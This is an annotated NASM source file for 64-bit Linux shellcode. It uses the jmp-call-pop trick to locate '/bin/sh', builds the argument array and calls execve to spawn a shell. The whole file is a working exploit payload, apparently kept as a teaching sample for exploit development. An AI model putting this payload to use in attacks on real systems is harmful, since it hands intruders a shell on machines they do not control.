;asmsyntax=nasm            ; uncomment it while editing and reopen to load color support
BITS 64                    ; code is for 64 bits machine
jmp short getString        ; jum to get "/bin/sh"

execve:                    ; execve("/bin/sh",pointer to NULL term. array,0)
pop   rdi                  ; address of /bin/sh is popped in rdi equ to 1st arg 
xor   rax,rax              ; zero out rax
mov   byte   [rdi+7],al    ; null terminatin our string      
mov   qword  [rdi+8],rdi   ; putting address of "/bin/sh" at [rdi+8]
mov   qword  [rdi+16],rax  ; null terminating our array of pointers
lea   rsi,[rdi+8]          ; equ to 2nd arg to execv
cdq                        ; zero out rdx :  equ to 3rd arg
mov   al,0x3b              ; loading system call number for execve
syscall

getString:                 ; label 
call   execve              ; this call gets us address of next instruction (which is our string) on stack
db '/bin/sh'               ; which is above popped in rdi 
